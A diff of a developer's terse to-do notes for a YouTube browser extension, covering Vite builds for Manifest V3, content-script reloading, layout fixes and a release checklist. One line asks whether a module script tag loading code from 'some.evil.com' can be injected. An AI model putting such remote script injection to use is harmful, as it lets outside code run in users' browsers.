@@ -1,30 +1,14 @@
-can i get vite and constent script reload manifest v3 working
-
-fall back to manifest v2 for dev
 
 read code superyoutube
-
-get it done
-
 
 vite
 when migrate to release
   build content.js, no need to inject
 
-
 keybinding to reload extension for unpacked-dev
-
-
-does content-vite need to speak to boackgroun.js???
-  getStorageData
-    player width
-    extension enabled
-
 
 next task
   port content to content-vite
-
-
 
 is <script src=http://some.evil.com/inject.js type=module /> possible?
 well it works for localhost...
@@ -43,3 +27,17 @@ comments, related hode merch
 test chat
 
 fix description order logged out
+  reorder #above-the-fold
+
+  how to tell if logged in???
+  future fix
+
+
+ release
+ build
+ cp
+ test
+ diff
+ version
+ zip
+ release 
